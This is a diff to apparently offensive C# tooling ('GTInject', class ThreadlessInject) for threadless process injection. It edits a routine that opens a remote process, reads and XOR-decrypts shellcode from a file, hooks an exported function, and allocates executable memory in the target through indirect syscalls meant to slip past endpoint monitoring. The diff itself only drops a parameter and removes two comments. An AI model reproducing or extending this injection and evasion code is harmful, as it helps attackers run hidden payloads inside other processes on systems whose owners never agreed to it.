@@ -16,7 +16,7 @@ namespace GTInject.Novel
 {
     internal class ThreadlessInject
     {
-        public static void Inject(int remoteProcessID, string dll, string export, string binLocation, string bytePath, string xorkey)
+        public static void Inject(int remoteProcessID, string dll, string export, string bytePath, string xorkey)
         {
             var hModule = GetModuleHandle(dll);
 
@@ -54,7 +54,7 @@ namespace GTInject.Novel
 
             Console.WriteLine($"[=] Opened process with id {pid}");
 
-            var shellcode = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var shellcode = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
 
             // backup the previous output handler connected to Console
             TextWriter backupOut = Console.Out;
@@ -832,7 +832,6 @@ namespace GTInject.Novel
         private static void GenerateHook(long originalInstructions)
         {
             var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
-            //Write the original 8 bytes that were in the original export prior to hooking
             writer.Seek(0x12, SeekOrigin.Begin);
             writer.Write(originalInstructions);
             writer.Flush();
@@ -847,7 +846,6 @@ namespace GTInject.Novel
                  remoteLoaderAddress < exportAddress + 0x70000000;
                  remoteLoaderAddress += 0x10000)
             {
-                //var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
                 var baseAddr = (IntPtr)remoteLoaderAddress;
                 var regionSize = (IntPtr)size;
                 var status = Syscalls.IndirectSysclNtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit|AllocationType.Reserve), (uint)(MemoryProtection.ExecuteRead));
